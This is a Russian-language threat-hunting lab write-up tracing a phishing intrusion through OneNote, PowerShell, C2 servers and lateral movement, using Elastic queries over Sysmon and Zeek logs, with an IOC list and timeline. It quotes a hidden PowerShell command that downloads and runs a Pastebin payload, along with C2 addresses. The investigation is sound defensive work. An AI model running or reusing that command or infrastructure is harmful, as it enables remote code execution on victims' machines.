=====================================================================
*	ВВедение	*
*************************

За основу для данного примера взята деятельность группировки "Stuxbot"
Их основной вектор атаки	-	использование фишинговых имейлов как первоначальная точка входа

Платформы под прицелом:		Microsoft Windows
Угрожаемые объекты:		Windows Users
Потенциальное воздействие:	Complete takeover of the victim's computer / Domain escalation
Уровень риска:			Critical

Что касаемо конкретно данного примера, то одним из сотрудников компании было получени письмо с ссылкой для скачивания файла,вложенным вредоносным файлом (invoice.one)
Как видно из расширения, файл принадлежит к программе Microsoft OneNote

Последовательность действий анализа будет основана на гипотезе об успешном фишинговом письме, доставляющем вредоносный файл OneNote.
Если бы нашей гипотезой было успешное выполнение двоичного файла с хэшем, соответствующим хэшу из отчета об угрозах, мы бы предприняли другую последовательность действий.
В отчете также указано, что все первоначальные взломы происходили через файлы «invoice.one».
Несмотря на это, мы также должны проводить поиски по другим IOC, поскольку субъекты угроз могли внедрить различные методы доставки между временем создания отчета и настоящим.

Данные о клиенте:

	-	организация относительно небольшая, около 200 сотрудников
	-	Характер деятельности	-	интернет-маркетинг, следовательно требования к ИТ-ресурсам минимальны
	-	Основное программное обеспечением являются офисные приложения, а Gmail служит нашим стандартным поставщиком электронной почты, доступ к которому осуществляется через веб-браузер.
	-	Microsoft Edge является браузером по умолчанию
	-	Удаленная техническая поддержка предоставляется через TeamViewer
	-	Корпоративные устройства управляются через объекты групповой политики Active Directory (GPO).

Поэтому, гипотеза основана на том, что потенциально вредоносный файл OneNote был загружен с Gmail, поставщика электронной почты нашей организации.
Возвращаясь к файлам «invoice.one», можно инициировать комплексный поиск на основе идентификатора события Sysmon 15 (FileCreateStreamHash), который представляет собой событие загрузки файла браузера.

Используемые инструменты

	-	ELASTIC
	-	ELK журналы:
			Windows audit logs (categorized under the index pattern windows*)
			Zeek logs (a network security monitoring tool, classified under the index pattern zeek*)

=====================================================================
*	Обнаружения	*
*************************

Initial Breach
Фишинговое письмо, содержащее ссылку на вредоносный файл, который выдает себя за файл счета-фактуры.

Криминалистическое расследование показало, что переход по ссылке, создает запрос к файлу OneNote, который постоянно размещается на файлообменнике (например, Mega.io или подобных платформах).
Этот файл OneNote маскируется под счет-фактуру с кнопкой «СКРЫТЫЙ», которая запускает встроенный пакетный файл.
Этот пакетный файл, в свою очередь, извлекает скрипты PowerShell, представляющие собой этап 0 вредоносной нагрузки.

C2 communication using RAT
RAT, используемый в данной атаке, является модульным, что подразумевает, что его можно дополнить бесконечным набором возможностей.
Хотя после установки RAT доступны лишь некоторые функции, мы отметили использование инструментов, которые захватывают дампы экрана, выполняют Mimikatz, предоставляют интерактивную оболочку CMD на скомпрометированных машинах и т. д.

Persistance
Все механизмы сохранения, используемые до сих пор, включали EXE-файл, размещенный на диске.

Lateral Movement
Было обнаружено два различных метода бокового перемещения:

	i)	Использование оригинального, подписанного Microsoft PsExec
	ii)	Использование WinRM

Indicators of Compromise (IOCs)

	-	OneNote and Onenote interrelated IoC:

			invoice.one
			OneNote.exe
			OneNoteM.exe
			cmd.exe
			invoice.bat
			powershell.exe
			https://pastebin.com/raw/33Z1jP6J
			default.exe
			DomainPasswordSpray.ps1
			XceGuhkzaTrOy.vbs
			https://transfer.sh/get/kNxU7/invoice.one
			https://mega.io/dl9o1Dz/invoice.one

	-	Registry Events

			registry.data.strings:	C:\Users\bob\AppData\Local\Temp\default.exe
			registry.key:		S-1-5-21-1518138621-4282902758-752445584-1107\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\LgvHsviAUVTsIN
			registry.path:		HKU\S-1-5-21-1518138621-4282902758-752445584-1107\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\LgvHsviAUVTsIN
			registry.value:		LgvHsviAUVTsIN

	-	Internet brosers:
			MS Edge
	
	-	Staging Entity (PowerShell Script):

			https://pastebin.com/raw/AvHtdKb2
			https://pastebin.com/raw/gj58DKz

	-	Malicious Nodes:

			34.197.10.85	(file.io)
			3.213.216.16	(file.io)
			104.20.67.143	(pastebin.com)
			104.20.68.143	(pastebin.com)
			172.67.34.170	(pastebin.com)
			18.158.249.75	(ngrok.io)
			18.192.31.165
			3.125.102.39
			3.125.223.134
			

	-	Victim Node

			192.168.28.130	(bob)

	-	Command and Control (C&C) Nodes:

			91.90.213.14:443
			104.20.67.143
			104.20.68.143
			172.67.34.170
			103.248.70.64:443				
			141.98.6.59:443
	
	-	Cryptographic Hashes of Involved Files (SHA256):

			AAEE893B24C9474B23E94C725A67D83F2722E4FED8BA8C25CE60BD76B30C0954	(invoice.one)
			E48D12609C2A898BA38642E611F4D46371E5243C9D0CFE8AF0FB7F611852FFA9	(SharpHound.exe)
			226A723FFB4A91D9950A8B266167C5B354AB0DB1DC225578494917FE53867EF2
			C346077DAD0342592DB753FE2AB36D2F9F1C76E55CF8556FE5CDA92897E99C7E
			018D37CBD3878258C29DB3BC3F2988B6AE688843801B9ABC28E6151141AB66D4	(default.exe)

	-	Computers (hostname) involved:

			WS001	(WS001.eagle.local - bob)

	-	Users (username) involved:

			bob	(C:\Users\bob\Downloads - куда был скачан invoice.one)

	-	Dates/Chronology

			Mar 26, 2023 @ 22:05:02.702					mail.google.com 							Пользователь зашел на свой почтовый ящик
			Mar 26, 2023 @ 22:05:35.541					file.io									После нажатия на ссылку, был осуществлен запрос к сайту file.io, и судя по всему скрытый
			Mar 26, 2023 @ 22:05:35.603					nav-edge.smartscreen.microsoft.com					MS Defender анализирует скачиваемый файл
			Mar 26, 2023 @ 22:05:41.594-905					192.168.28.130	34.197.10.85		443				5 записей-обращений к file.io, указывающих на загрузку
			Mar 26, 2023 @ 22:05:53.601														Дата иницилизации запросу OneNote.EXE к invoice.one
			Mar 26, 2023 @ 22:06:11.487														Средняя запись демонстрирует (при развертывании) новый процесс OneNoteM.exe, который является компонентом OneNote и помогает запускать файлы.
			Mar 26, 2023 @ 22:06:28.250														Верхняя запись показывает «cmd.exe» в работе, выполняя файл с именем «invoice.bat». Вот вид при развертывании журнала.
			Mar 26, 2023 @ 22:06:29.589														Запус owershell скрипта, инициированный invoice.bat
			Mar 26, 2023 @ 22:06:32.447 & 35:187													Создание нескольких файлов, которые необходимы на начальном этапе
			Mar 26, 2023 @ 22:06:35.317														Обращение к pastebin.com
			Mar 26, 2023 @ 22:06:36.943														Переадресация к ngrok.io (Ngrok, вероятно, использовался как C2	-	для маскировки вредоносного трафика на известный домен)
			Mar 26, 2023 @ 22:06:36.970 & 37:472													Установка связи с потенциально возможным С2 сервером
			Mar 26, 2023 @ 22:17:32.961														Размещение потенциально вреденосного файла на диске (default.exe)
			Mar 26, 2023 @ 22:17:33.533	default.exe			C:\Users\bob\AppData\Local\Temp\default.exe		WS001		Взлом учетной записи WS001/bob
			Mar 26, 2023 @ 22:17:33.845														Создание подозрителбно записи в реестре
			Mar 26, 2023 @ 22:17:34.845	default.exe	 - 	3	18.192.31.165								Установка соединения или смена С2 сервера
			Mar 26, 2023 @ 23:23:57.243														Размещение потенциально вреденосного файла на диске (DomainPasswordSpray.ps1)
			Mar 26, 2023 @ 23:34:57.232				4625	DC1						administrator		Неудачня попытка взлома аккаунта
			Mar 26, 2023 @ 23:47:37.751	default.exe	 - 	3	3.125.102.39								Установка соединения или смена С2 сервера
			Mar 26, 2023 @ 23:49:29.638	default.exe	 - 	3	3.125.223.134								Установка соединения или смена С2 сервера
			Mar 26, 2023 @ 23:53:26.928				4625	DC1						administrator		Не
			Mar 27, 2023 @ 00:10:18.596	default.exe	 - 	3	18.158.249.75								Установка соединения или смена С2 сервера
			Mar 27, 2023 @ 00:12:43.663	default.exe	 - 	11	C:\Users\bob\AppData\Local\Temp\svchost.exe				Загрузка исполняемого (потенциально вредоносного) файла
			Mar 27, 2023 @ 00:17:01.805	default.exe	 - 	11	C:\Users\Public\SharpHound.exe						Загрузка исполняемого (потенциально вредоносного) файла
			Mar 27, 2023 @ 00:17:58.000	SharpHound.exe		1	sharphound.exe, -collectionmethod, all					Запуск SharpHound.exe
			Mar 27, 2023 @ 00:19:30.119	SharpHound.exe		1	Sharphound.exe, -c, all							Запуск SharpHound.exe
			Mar 27, 2023 @ 09:44:01.496	default.exe	 - 	3	3.125.223.134								Установка соединения или смена С2 сервера
			Mar 27, 2023 @ 22:58:04.493	default.exe	 - 	3	3.125.102.39								Установка соединения или смена С2 сервера
			Mar 27, 2023 @ 23:25:58.082	default.exe	 - 	11	C:\Users\bob\AppData\Local\Temp\svchost.exe				Загрузка исполняемого (потенциально вредоносного) файла
			Mar 27, 2023 @ 23:25:58.652	svchost.exe			C:\Users\bob\AppData\Local\Temp\svchost.exe		WS001		Взлом учетной записи WS001/bob посредством вредоносного исполняемого файла svchost.exe
			Mar 27, 2023 @ 23:27:25.920	default.exe	 - 	11	C:\Users\bob\AppData\Local\Temp\__PSScriptPolicyTest_3wfnsrzg.yff.ps1	Загрузка исполняемого (потенциально вредоносного) файла
			Mar 28, 2023 @ 00:00:18.309				4624	PAW						svc-sql1		Удачня попытка взлома аккаунта
			Mar 28, 2023 @ 00:06:20.432				4624	PAW						svc-sql1		Удачня попытка взлома аккаунта
			Mar 28, 2023 @ 00:11:27.177	default.exe	 - 	11	C:\Users\bob\AppData\Local\Temp\PsExec64.exe				Загрузка исполняемого (потенциально вредоносного) файла
			Mar 28, 2023 @ 00:18:12.402	default.exe			default.exe						PKI		Боковое скольжение в злом учетной записи PKI посредством вредоносного исполняемого файла default.exe
			Mar 28, 2023 @ 00:21:48.009	default.exe	 - 	11	C:\Users\svc-sql1\AppData\Local\Temp\XceGuhkzaTrOy.vbs			Загрузка исполняемого (потенциально вредоносного) файла
			Mar 28, 2023 @ 00:23:51.653	default.exe	 - 	11	C:\Users\svc-sql1\AppData\Local\Temp\svchost.exe			Загрузка исполняемого (потенциально вредоносного) файла
			Mar 28, 2023 @ 00:23:52.239	svchost.exe			C:\Users\svc-sql1\AppData\Local\Temp\svchost.exe	PKI		Взлом учетной записи svc-sql1 посредством вредоносного исполняемого файла svchost.exe
			Mar 28, 2023 @ 00:17:50.401				4624	PKI							svc-sql1	Удачня попытка взлома аккаунта
			Mar 28, 2023 @ 00:37:41.697				4624	PKI							svc-sql1	Удачня попытка взлома аккаунта
			Mar 28, 2023 @ 00:40:12.705	default.exe	 - 	11	C:\Users\Public\payload.exe						Загрузка исполняемого (потенциально вредоносного) файла
	
=====================================================================
*	Действия	*	
*************************

	1)	Поиск файла из отчета

	В отчете указано, что все первоначальные компрометации происходили через файлы "invoice.one".
	Поэтому, запускаем ELK, устанавливаем необходимый временной диапозон и ищем все события связанные с данным файло в журнале WINDOWS

		file.name:*invoice.one

	В результате получем 3 записи
	Для подтверждения того, что файл был загружен через браузер, необходимо оптимизировать поиск с добавление по поиску через event.code (или winlog.event_id)
	Один из способов - это использование идентификатора события Sysmon 15 (FileCreateStreamHash), который представляет собой событие загрузки файла браузера.

		event.code:15 AND file.name:*invoice.one

	В результате видим записи, указывающие на то, что искомый файл был скачан посредством браузер и не факт, что пользователь знал об этом (в нашем случае это одни и теже записи)
	Тем не менее, пока это не может являтся подтверждением того, что этот файл является вредоносным (тот, о котором говорилось в отчете)
	Более того, пока еще не было предоставлено каких-либо признаков исполнения файла
	
	Так как файл был скачан из интерент, то мы можем проверить к какой зоне он относится (т.н. Zone.Identifier)

		event.code:11 AND file.name:invoice.one*
	
	Запрос похож на предыдущий, но звездочка находится в конце, поскольку имя файла включает только имя файла с дополнительным идентификатором зоны, что, вероятно, указывает на то, что файл был получен из Интернета.
	Если мы расширим журнал событий, чтобы отобразить его полное содержимое каждой записи, то увидим, что MSEdge был приложением (на что указывает process.name или process.executable), которое использовалось для загрузки файла, который хранился в папке «downloads» сотрудника по имени bob.
	Также следует отметить временную метку события (в нашем случае - 26 марта 2023 г. @ 22:05:47)

	Отличия event.code 15 vs 11 приминительно нашего случая:
		-	event id 15 предоставляет HASH заначения скачанного файла, но не указывает тип зоны скачивания
		-	event if 11 наоборот говорит о том, что файл имеет таг Zone.Identifier (без указания номера зоны), но не предоставляет HASH-значения файла

	Относительно легко сделать вывод, что машина, которая сообщила о файле "invoice.one", имеет имя хоста WS001 (поля host.hostname или host.name события Sysmon Event ID 11)
	А также IP-адрес 192.168.28.130, что можно подтвердить, проверив любое событие сетевого подключения (Sysmon Event ID 3) с этой машины (выполните следующий запрос event.code:3 AND host.hostname:WS001 и проверьте поле source.ip).

	2)	Проверка сетевых подключений жертвы

	Если мы проверим сетевые подключения, использующие Sysmon Event ID 3 примерно во время загрузки этого файла, мы обнаружим, что в Sysmon нет записей.
	Это обычная конфигурация, позволяющая избежать захвата сетевых подключений, созданных браузерами (что может привести к огромному объему журналов, особенно тех, которые связаны с нашим поставщиком электронной почты).
	Вот где журналы Zeek оказываются бесценными.
	
	Нам следует отфильтровать и изучить DNS-запросы, которые Zeek перехватил от WS001 в интервале с 22:05:00 до 22:05:48, когда был загружен файл.
	Наш запрос Zeek будет искать исходный IP-адрес, соответствующий 192.168.28.130, и поскольку мы запрашиваем DNS-запросы, мы выберем только те журналы, в которых есть что-то в поле dns.question.name.

		source.ip:192.168.28.130 AND dns.question.name:*

	К сожалению, почти всегда, это также отображает очень много шума (например google.com и т. д.), поэтому необходимо отфильтровать это.
	Какой именно шум должен быть исключен зависит от конкретного случая	
	Вот несколько фильтров для нашего случая (нам надо исключить их из общего числа найденных совпадений):
		*
		www.google.com
		www.google-analytics.com
		30.2.52.216.in-addr.arpa

	Однако, все-равно много шума.
	Так что, можно продолжать добавлять фильтры, либо просматривать в ручную
	
	3)	Выявление и анализ потенциально вредоносного сайта

	В нашем случае ручной поиск выявил один адресс

		file.io

	***	Особое внимание стоит уделять записям ***.smartscreen.microsoft.com, так как это говорить о том, что MS Defender SmartScreen сканировал файл скачанный с интерент ресурса
		Сайт или IP-адрес следующий после ***.smartscreen.microsoft.com записи будет является ресурсом, откуда был скачан файл

	***	Тажке стоит обращать внимание на записи mail.***.com (в гашем случае mail.google.com), так как они свидедельствуют о попытке доступа к почтовому ресурсу (в нашем случае GMail)

	Касательно нашего случает прослеживаентся следущая хронология события

		Mar 26, 2023 @ 22:05:02.702	mail.google.com (пользователь зашел на свой почтовый ящик)
		...SNIP...
		Mar 26, 2023 @ 22:05:35.541	file.io		(после нажатия на ссылку, был осуществлен запрос к сайту file.io, и судя по всему скрытый)
		...SNIP...
		Mar 26, 2023 @ 22:05:35.603	nav-edge.smartscreen.microsoft.com	(MS Defender анализирует скачиваемый файл)
		
	Из анализа данных мы видим, что сперва пользователь получил доступ к Google Mail
	После чего взаимодействовал с "file.io" (это известный хостинг-провайдер)
	Затем Microsoft Defender SmartScreen инициировал сканирование файла, которое обычно запускается при загрузке файла через Microsoft Edge.
	
	Развертывание записи журнала для file.io показывает возвращенные IP-адреса (поля dns.answers.data или dns.resolved_ip или zeek.dns.answers)	-	34.197.10.85 и 3.213.216.16
		
	Чтож, давайте просмотрим каждый из обнаруженых IP-адресов через журнал Zeek
	Но, чтобы отображение было более user-friendly, отсортируем результат по полям	-	source.ip, destination.ip and destination.port
	Анализ выявил установленную связь между IP жертвой и сайтом file.io (в общей сложности 5 записей подряд)

		Mar 26, 2023 @ 22:05:41.905	192.168.28.130	34.197.10.85	443
	
	Эта информация (5 записей) подтверждает, что пользователь Боб успешно загрузил файл "invoice.one" с хостинг-провайдера "file.io".

	На этом этапе у нас есть два варианта:
		-	мы можем либо сопоставить данные с отчетом Threat Intel, чтобы выявить перекрывающуюся информацию в нашей среде
		-	либо провести расследование, подобное реагированию на инциденты (IR), чтобы отследить последовательность событий после загрузки файла OneNote.

	Мы выбираем последний подход, отслеживая последующие действия.
	
	4)	Выявление связанных событий после загрузки вредоносного файла

	Гипотетически, если был запрос к "invoice.one", он будет открыт с помощью приложения OneNote.
	Таким образом, нас следует пронализировать журнал Windows для вявление этих взаимосвязей
	****	Примечание: временные рамки, которые мы указали ранее, следует удалить, установив их снова, скажем, на 15 лет.
		Столбец dns.question.name также следует удалить.
	
		event.code:1 AND process.command_line:*invoice.one*

	Действительно, мы обнаружили, что к загруженному файлу invoice.one был осуществлен запрос приложением OneNote вскоре после его загрузки (с задержкой примерно в 6 секунд).
	
		Mar 26, 2023 @ 22:05:53.601	...SNIP...

	А так как пользователь не скачивал данный файл и следовательно не обращался к загруженному файлу через OneNote самостоятельно, то мы можем предположить, что invoice.one содержит либо вредоносную ссылку, либо вредоносное вложение.
	В любом случае OneNote.exe инициирует либо браузер, либо вредоносный файл.
	Поэтому мы должны тщательно изучить все новые процессы, где OneNote.exe является родительским процессом.
	***	И всегда сверяем временные метки, чтобы определить не только последоватльность, но и взаимосвязь
	
		event.code:1 AND process.parent.name:"ONENOTE.EXE"

	В результате мы имеем три совпадения, но только самое нижнее выходит за рамки соответствующего временного интервала и может быть отклонено.
	Анализ остальных двух дал следующие результаты:

		-	Mar 26, 2023 @ 22:06:11.487	-	Средняя запись демонстрирует (при развертывании) новый процесс OneNoteM.exe, который является компонентом OneNote и помогает запускать файлы.
				process.parent.command_line:	"C:\Program Files\Microsoft Office\Root\Office16\ONENOTE.EXE" "C:\Users\bob\Downloads\invoice.one"
				process.parent.executable:	C:\Program Files\Microsoft Office\root\Office16\ONENOTE.EXE

		-	Mar 26, 2023 @ 22:06:28.250	-	Верхняя запись показывает «cmd.exe» в работе, выполняя файл с именем «invoice.bat». Вот вид при развертывании журнала.
				process.command_line:		C:\WINDOWS\system32\cmd.exe /c ""C:\Users\bob\AppData\Local\Temp\OneNote\16.0\Exported\{EC284AA9-1F31-4DC4-B3C5-3EEE8137EBC3}\NT\0\invoice.bat" "
				process.executable:		C:\Windows\System32\cmd.exe

	Как мы видим, прослеживается связьь между "OneNote.exe", подозрительным "invoice.one", выполнением "cmd.exe", который инициирует "invoice.bat" из временного расположения (весьма вероятно, из-за его прикрепления внутри файла OneNote).
	Следубщий вопрос	-	выяснить, спровоцировал ли этот пакетный скрипт (invoice.bat) что-то еще?
	
	5)	Анализ обнаруженного IoC (bat скрипт - invoice.bat) и связанных с ним процессов

	Теперь давайте выясним, породил ли родительский процесс с аргументом командной строки, указывающим на пакетный файл, какие-либо дочерние процессы с помощью следующего запроса.
	Чтобы результат содержал только нужную информацию, мы сразу отсортируем его по следубщим параметрам/столбцам	-	process.name, process.args and process.pid

		event.code:1 AND process.parent.command_line:*invoice.bat*

	Запрос вернул следующий результат, в котором запуск PowerShell и переданные ему аргументы выглядят весьма подозрительно!
	Команда для загрузки и выполнения контента с Pastebin, поставщика открытого текстового хостинга!
	Мы можем попытаться получить доступ и посмотреть, доступен ли еще контент, который скрипт пытался загрузить.

		Mar 26, 2023 @ 22:06:29.589	powershell.exe		powershell.exe, -nop, -w, hidden, -noni, -noexit, iex (iwr https://pastebin.com/raw/33Z1jP6J -usebasicparsing)		9,944

	И действительно, это так!
	Ибо данная информация подтверждается отчетом Threat Intelligence

	Чтобы выяснить, что сделал PowerShell, мы можем отфильтровать по идентификатору и имени процесса, использую следующую комнаду
	***	Для читабельности, что мы добавили поле event.code в качестве столбца, и уберем process.pid.

		process.pid:"9944" and process.name:"powershell.exe"

	Первичный результат показал несколько различных Event ID	-	создание процесса (1), попытки сетевых подключений (3), создание файла (11), запись в реестре (13), некоторые разрешения DNS (22) и попытка входа (4648)
	Чтобы не просматривать каждое событие по отдельности, добавим несколько сортировочных столбцов, для отображения необходимой информации (file.path, destination.ip и dns.question.name)

	Обновленный результат дает нам обширные данные о действиях.
		
		Mar 26, 2023 @ 22:06:32.447 & 35:187	Создание нескольких файлов, которые необходимы на начальном этапе
		Mar 26, 2023 @ 22:06:35.317		Обращение к pastebin.com
		Mar 26, 2023 @ 22:06:36.943		Переадресация к ngrok.io (Ngrok, вероятно, использовался как C2	-	для маскировки вредоносного трафика на известный домен)
		Mar 26, 2023 @ 22:06:36.970 & 37:472	Установка связи с потенциально возможным С2 сервером
		Mar 26, 2023 @ 22:17:32.961		Размещение потенциально вреденосного файла на диске (default.exe)
		Mar 26, 2023 @ 22:17:33.845		Создание подозрителбно записи в реестре
		Mar 26, 2023 @ 23:23:57.243		Размещение потенциально вреденосного файла на диске (DomainPasswordSpray.ps1)

	Для связи с Ngrok был использоан порт№ 443, что подразумевает, что трафик был зашифрован.
	Сброшенный EXE-файл, вероятно, предназначен для сохранения.
	Его отличительное имя должно облегчить определение того, был ли он когда-либо выполнен.

	Важно отметить временные метки — между различными действиями есть некоторый промежуток времени, что предполагает, что это вряд ли было сделано по сценарию, но, возможно, имело место фактическое взаимодействие человека (если только между выполненными действиями не произошел случайный сон).
	Последние действия, на которые указывает этот процесс, — это запрос DNS для DC1 и подключения к нему.

	6)	Анализ возимодействия с новооткрытыми IP-адресами/URL

	Для анализа взаимодествия с обнаруженным IP-адресом (18.158.249.75) перейдем в журнал Zeek
	Для информативности добавим следующие сортировочные столбцы	-	source.ip, destination.ip и destination.port
	Наш запрос будет состоять всего лишь из IP-адреса

		18.158.249.75

	Интересно, что активность, похоже, распространилась на следующий день и закончилась также на следующий день 
	Причина прекращения активности неясна... Произошло ли изменение C2 IP? Или атака просто прекратилась?

		Mar 27, 2023 @ 00:10:17.170	192.168.28.130	18.158.249.75	443
	
	Для получения более развернутой картины проверим взаимодействи с доменом ngrok.io

		ngrok.io	

	Из полученного результат мы можем видеть некоторые изменения, которые не ограничилсь лишь March 26, но и продолжались на следующих днях
	
		i)		Последнее обращение к IP-address 18.128.249.75 было March 27взаимодействовал не только с 192.168.28.130, а такжу с 192.168.28.128 и 192.168.28.132

					Mar 27, 2023 @ 23:25:58.134	192.168.28.130	192.168.28.200	53	18.158.249.75
	
		ii)		Обращение к новому IP-адресу 18.192.31.165 причем не только March 26-27, но и March 28
			
					Mar 26, 2023 @ 16:02:13.563	192.168.28.128	192.168.28.2	53	18.192.31.165
					Mar 26, 2023 @ 23:44:58.681	192.168.28.130	192.168.28.200	53	18.192.31.165
					Mar 27, 2023 @ 00:12:43.017	192.168.28.130	192.168.28.200	53	18.192.31.165
					Mar 28, 2023 @ 00:41:23.111	192.168.28.132	192.168.28.200	53	18.192.31.165

​		iii)		Обращение к новому IP-адресу 3.125.102.39 причем не только March 26-27, но и March 28-29

					Mar 26, 2023 @ 23:47:35.792	192.168.28.130	192.168.28.200	53	3.125.102.39
					Mar 27, 2023 @ 23:23:29.614	192.168.28.130	192.168.28.200	53	3.125.102.39
					Mar 28, 2023 @ 00:18:12.640	192.168.28.132	192.168.28.200	53	3.125.102.39
					Mar 29, 2023 @ 18:39:27.436	192.168.28.132	192.168.28.200	53	3.125.102.39

		iv)		Обращение к новому IP-адресу 3.125.223.134 причем не только March 26-27, но и March 28

					Mar 26, 2023 @ 23:49:27.697	192.168.28.130	192.168.28.200	53	3.125.223.134
					Mar 26, 2023 @ 23:51:14.841	192.168.28.130	192.168.28.200	53	3.125.223.134
					Mar 27, 2023 @ 10:09:26.728	192.168.28.130	192.168.28.200	53	3.125.223.134
					Mar 28, 2023 @ 00:23:51.970	192.168.28.132	192.168.28.200	53	3.125.223.134

	Таким образом, очевидно, что сетевая активность сохраняется, и мы можем сделать вывод, что к C2 обращались постоянно.

	7)	Анализ еще одного загруженного (потенциально вредоносного) файла - default.exe

	Далее, мы попытаемся вяснить - а исполнялся ли когда-нибудь другой загруженный файла "default.exe"
	Для этого вернемся в журнал Windows
	Будем искать любый процессы связанные с этим файлом.
	Для простоты анализа использем следующие колонки	-	process.name, process.args, event.code, file.path, destination.ip и dns.question.name

		process.name:"default.exe"

	Анализ показываем весьма интересную картину:
		Множество различных событий - создание процесса (1), попытки сетевых подключений (3), завершение процесса (5), изменение процесса/внедрение кода (5), создание файла (11), запись в реестре (13), некоторые разрешения DNS (22) и попытка входа (4648)
		Исполняемый файл (default.exe) неоднократно менял С2 сервер

			Mar 26, 2023 @ 22:17:34.845	default.exe	 - 	3	 - 	18.192.31.165	 -
			Mar 26, 2023 @ 23:47:37.751	default.exe	 - 	3	 - 	3.125.102.39	 -
			Mar 26, 2023 @ 23:49:29.638	default.exe	 - 	3	 - 	3.125.223.134	 -
			Mar 27, 2023 @ 00:10:18.596	default.exe	 - 	3	 - 	18.158.249.75	 -
			Mar 27, 2023 @ 09:44:01.496	default.exe	 - 	3	 - 	3.125.223.134	 - 
			Mar 27, 2023 @ 22:58:04.493	default.exe	 - 	3	 - 	3.125.102.39	 - 

		Было загружено еще несколько исполняемых файла (потенциально вредоносных)

			Mar 27, 2023 @ 00:12:43.663	default.exe	 - 	11	C:\Users\bob\AppData\Local\Temp\svchost.exe				 - 	 - 
			Mar 27, 2023 @ 00:17:01.805	default.exe	 - 	11	C:\Users\Public\SharpHound.exe						 - 	 - 	
			Mar 27, 2023 @ 23:25:58.082	default.exe	 - 	11	C:\Users\bob\AppData\Local\Temp\svchost.exe				 - 	 - 
			Mar 27, 2023 @ 23:27:25.920	default.exe	 - 	11	C:\Users\bob\AppData\Local\Temp\__PSScriptPolicyTest_3wfnsrzg.yff.ps1	 - 	 - 
			Mar 28, 2023 @ 00:11:27.177	default.exe	 - 	11	C:\Users\bob\AppData\Local\Temp\PsExec64.exe				 - 	 - 
			Mar 28, 2023 @ 00:21:48.009	default.exe	 - 	11	C:\Users\svc-sql1\AppData\Local\Temp\XceGuhkzaTrOy.vbs			 -	 -
			Mar 28, 2023 @ 00:23:51.653	default.exe	 - 	11	C:\Users\svc-sql1\AppData\Local\Temp\svchost.exe			 - 	 - 
			Mar 28, 2023 @ 00:40:12.705	default.exe	 - 	11	C:\Users\Public\payload.exe						 - 	 - 

		SharpHound — это признанный инструмент для построения диаграмм Active Directory и определения путей атак для эскалации.
		Что касается svchost.exe, то скорее всего это еще один вредоносный агент
		Название подразумевает, что он пытается имитировать законный файл svchost, который является частью операционной системы Windows
		Также были загружены payload.exe, файла VBS и повторные загрузки «svchost.exe»

	Анализируя данный файл через Threat Intelegence мы можем обнаружть егое hash (sha256)
	Более того, когда данный файл был впервые загружен на хост жертвы, ему таже был присвоен hash (sha256)
	Удивительно, но они совпадают

		process.hash.sha256	018d37cbd3878258c29db3bc3f2988b6ae688843801b9abc28e6151141ab66d4

	Это заставляет нас задаться вопросом	-	был ли этот исполняемый файл обнаружен на других устройствах в среде?
	Давайте проведем расширенный поиск.
	В качество дополнительно сортирофочного фильтра, добавим столбец host.hostname, а столбцы file.path, destination.ip и dns.question.name уберем

		process.hash.sha256:018d37cbd3878258c29db3bc3f2988b6ae688843801b9abc28e6151141ab66d4

	Файлы с этим значением хэша были обнаружены на WS001 и PKI, что указывает на то, что злоумышленник также взломал сервер PKI как минимум.
	Также, похоже, что файл если один и тот же вредоносный файл использовался на 3 разных аккаунтах то можно предположить, что учетная запись пользователя (svc-sql1) вероятно была тоже скомпрометирована.

		Mar 26, 2023 @ 22:17:33.533	default.exe	C:\Users\bob\AppData\Local\Temp\default.exe		WS001
		Mar 27, 2023 @ 23:23:30.020	default.exe	C:\Users\bob\AppData\Local\Temp\default.exe		WS001
		Mar 27, 2023 @ 23:25:58.652	svchost.exe	C:\Users\bob\AppData\Local\Temp\svchost.exe		WS001
		Mar 28, 2023 @ 00:18:12.402	default.exe	default.exe						PKI
		Mar 28, 2023 @ 00:23:52.239	svchost.exe	C:\Users\svc-sql1\AppData\Local\Temp\svchost.exe	PKI

	Подтверждением взлома можно считать исполнение файла default.exe в PKI, посредством процесса «PSEXESVC», где он является родительским процессом
	Компонент PSExec из SysInternals	-	один из инструментов для удаленного выполнения команд, который часто применяется для горизонтального перемещения при взломе Active Directory.

		ParentImage:		C:\Windows\PSEXESVC.exe
		ParentCommandLine:	C:\Windows\PSEXESVC.exe
		process.args:		default.exe
		process.parent.args:	C:\Windows\PSEXESVC.exe

	8)	Анализ действия исполняемого файла SharpHound.exe

	Для посика какой-либо активности данного исполняемого файла, нам надо осуществить поиск процессов с одноименным именем
	При этом список сортировочных стлобцов оставим без изменений (с предыдущего запроса)

		process.name:"SharpHound.exe"

	Результат показал, что данный файл был запущен 2 раза

		Mar 27, 2023 @ 00:17:58.000	SharpHound.exe	sharphound.exe, -collectionmethod, all	1	 - 	 - 	 - 
		Mar 27, 2023 @ 00:19:30.119	SharpHound.exe	Sharphound.exe, -c, all			1	 - 	 - 	 - 

	9)	Анализ взлома аккаунта svc-sql1

	Единственное правдоподобное объяснение, из имеющихся данных, того как был скомпрометирован пароль "svc-sql1"	-	это потенциально ранее загруженный скрипт PowerShell, по-видимому, предназначенный для подбора пароля.
	Мы знаем, что он был загружен на WS001, поэтому мы можем проверить любые успешные или неудачные попытки ввода пароля с этой машины, за исключением тех, что были у Боба, пользователя этой машины (и самой машины).
	Для этого нам необходимо отфильтровать события по :
		-	успешную попытку входа (event.code:4624)
		-	провальную попытку входа (event.code:4625)
		-	попыткам входа в компьютер с/на другого компьютера в сети (winlog.event_data.LogonType:3)
		-	собственно IP зоста, с которого осуществлялся вход
	А также незабыть изменить сортировочные столбцы на event.code, agent.hostname, user.name 
	При этом надо будет убрать из сортировки пользователя bob и его username WS001

		(event.code:4624 OR event.code:4625) AND winlog.event_data.LogonType:3 AND source.ip:192.168.28.130
		
	Результаты весьма интересные	-	две неудачные попытки для учетной записи administrator , примерно в то время, когда была обнаружена первоначальная подозрительная активность.
	Впоследствии было предпринято множество успешных попыток входа для «svc-sql1».
	Похоже, они попытались взломать пароль администратора, но потерпели неудачу.
	Однако два дня спустя, 28-го числа, мы наблюдаем успешные попытки с svc-sql1.

​		Mar 28, 2023 @ 00:37:41.697	4624	PKI	svc-sql1
		Mar 28, 2023 @ 00:17:50.401	4624	PKI	svc-sql1
		Mar 28, 2023 @ 00:06:20.432	4624	PAW	svc-sql1
		Mar 28, 2023 @ 00:00:18.309	4624	PAW	svc-sql1
		Mar 26, 2023 @ 23:53:26.928	4625	DC1	administrator
		Mar 26, 2023 @ 23:34:57.232	4625	DC1	administrator
